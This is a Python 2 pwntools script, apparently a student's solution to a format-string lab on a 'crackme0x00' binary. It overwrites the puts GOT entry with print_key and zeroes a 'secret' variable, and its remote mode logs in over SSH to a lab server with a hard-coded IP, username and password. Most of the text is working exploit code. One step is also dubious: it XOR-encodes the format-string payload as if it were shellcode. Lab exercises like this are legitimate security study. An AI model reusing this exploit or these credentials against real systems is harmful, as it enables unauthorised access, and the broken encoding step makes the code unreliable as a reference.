#!/usr/bin/env python2

import os
import re
import sys

from pwn import *

context.arch = "x86"
context.bits = 32
debug = False
exe = "./crackme0x00"

ip = '52.201.10.159'
user = 'lab05'
myPassword = '9a6d5757'

if args['JAKE']:
    debug = True

if args['REMOTE']:
    s = ssh(user, ip, password=myPassword)
    p = s.process(exe, cwd='/home/lab05/tut05-fmtstr')

if args['LOCAL']:
    # Run shit
    p = process(exe)

def writeToFile(payload):
    # Write shellcode to a binary
    f = open('shellcode', 'w')
    f.write(payload)
    f.close()

def exec_fmt(payload):
    p = process(exe)
    p.sendline(payload)
    return p.recvall()

def getOffset():
    return FmtStr(exec_fmt).offset

# Find our addresses
target_binary = ELF(exe)

# Get address of local function that we want to point to.
printKeyAddr = target_binary.symbols['print_key']

# Get the address of the libc function in the GOT table
putsAddr = target_binary.got['puts']

# Get the address of the global variable that we need to overwrite.
secretAddr = target_binary.symbols['secret']

# Just need to change the value at the secret address but we dont want to write too much.
writes = {secretAddr: 0x0, putsAddr: printKeyAddr}

# The garbage to fill the buffer
padding = "bb"

# Create payload
payload = padding +fmtstr_payload(getOffset(),
                                  writes, 
                                  numbwritten=15+5, 
                                  write_size='byte')

avoid = b'/bin/sh\xcc\xcd\x80'
payload = pwnlib.encoders.i386.xor.encode(payload, avoid)
print payload
# Make sure payload isn't too big. This was causing a segfault that took forever to debug.
len_payload = len(payload)
if len_payload > 100:
    print "Length of payload is too big ({})".format(len_payload)
    raise SystemExit
else:
    log.success('Payload len: %d', len_payload)

if debug == True:
    writeToFile(payload)
    script = '''
    b crackme0x00.c:37
    b puts
    r < <(cat shellcode)
    '''.format(payload)
    print script
    gdb.attach(p, script)
else:
    p.sendline(payload)
    print p.recvall()
